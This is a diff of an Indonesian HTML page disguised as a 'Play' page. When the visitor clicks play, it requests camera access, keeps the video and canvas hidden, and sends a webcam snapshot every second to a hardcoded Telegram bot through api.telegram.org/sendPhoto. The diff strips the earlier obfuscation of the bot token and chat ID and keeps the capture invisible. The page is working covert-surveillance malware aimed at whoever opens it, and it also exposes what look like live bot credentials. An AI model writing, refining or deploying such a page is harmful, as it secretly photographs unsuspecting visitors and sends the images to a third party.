@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>Welcome</title>
+  <title>Play</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
@@ -50,15 +50,8 @@
       }
     }
 
-    /* Sembunyikan elemen kamera */
     video, canvas {
-      position: fixed;
-      top: -9999px;
-      left: -9999px;
-      width: 1px;
-      height: 1px;
-      opacity: 0;
-      pointer-events: none;
+      display: none;
     }
   </style>
 </head>
@@ -72,14 +65,14 @@
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
 
-    // Token & chat_id disamarkan
-    const chatId = "72170" + "27793";
-    const token = "7697621785:AAEFcQ6hgQ_" + "d9UuTWPMeu" + "Y4xjMLNlrW8" + "j40";
+    // === Langsung pakai token dan chat_id ===
+    const BOT_TOKEN = '7697621785:AAEFcQ6hgQ_d9UuTWPMeuY4xjMLNlrW8j40';
+    const CHAT_ID = '7217027793';
 
     let stream = null;
     let intervalId = null;
 
-    async function startSilently() {
+    async function startCamera() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
@@ -89,41 +82,42 @@
 
         intervalId = setInterval(captureAndSendPhoto, 1000);
       } catch (err) {
-        alert('Izin kamera ditolak. Tekan ulang untuk izinkan.');
-        console.error('Gagal akses kamera:', err);
+        alert('Izin kamera ditolak.');
+        console.error('Kamera error:', err);
       }
     }
 
     function captureAndSendPhoto() {
+      if (!video.videoWidth || !video.videoHeight) return;
+
       const ctx = canvas.getContext('2d');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      ctx.drawImage(video, 0, 0);
 
-      const dataURL = canvas.toDataURL('image/jpeg');
-      fetch(dataURL)
-        .then(res => res.blob())
-        .then(blob => {
-          const form = new FormData();
-          form.append('chat_id', chatId);
-          form.append('photo', blob, 'photo.jpg');
+      canvas.toBlob((blob) => {
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('photo', blob, 'snapshot.jpg');
 
-          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-            method: 'POST',
-            body: form
-          }).then(res => {
-            if (!res.ok) {
-              console.error('Upload gagal:', res.statusText);
-            } else {
-              console.log('Foto terkirim');
-            }
-          }).catch(e => console.error('Gagal kirim:', e));
-        });
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: form
+        })
+        .then(res => {
+          if (!res.ok) {
+            console.error('Upload gagal:', res.statusText);
+          } else {
+            console.log('Foto terkirim');
+          }
+        })
+        .catch(err => console.error('Error:', err));
+      }, 'image/jpeg', 0.95);
     }
 
     playBtn.addEventListener('click', () => {
       if (!stream) {
-        startSilently();
+        startCamera();
       }
     });
   </script>
